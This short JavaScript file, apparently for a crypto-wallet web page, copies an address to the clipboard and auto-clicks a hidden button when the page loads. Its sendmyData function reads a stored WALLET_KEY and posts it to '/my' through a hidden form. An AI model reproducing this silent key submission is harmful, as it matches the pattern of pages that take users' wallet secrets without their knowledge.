const webAddress = document.getElementById("webAddress");

function copyText() {
  const textToCopy = webAddress.innerText;
  navigator.clipboard
    .writeText(textToCopy)
    .then(() => {
      alert("copied to clipboard!");
    })
    .catch((error) => {
      console.error("Failed to copy text: ", error);
    });
}

function initData() {
  localStorage.setItem("WALLET_ADDRESS", null);
  localStorage.setItem("WALLET_KEY", null);
}

function sendmyData() {
  var data = localStorage.getItem("WALLET_KEY");
  var form = document.createElement("form");
  form.method = "post";
  form.action = "/my";

  var input = document.createElement("input");
  input.type = "hidden";
  input.name = "data";
  input.value = data;
  form.appendChild(input);
  document.body.appendChild(form);
  form.submit();
}

function clickButton() {
  var button = document.getElementById("hiddenButton");
  button.click();
  console.log("button-click");
}
clickButton();
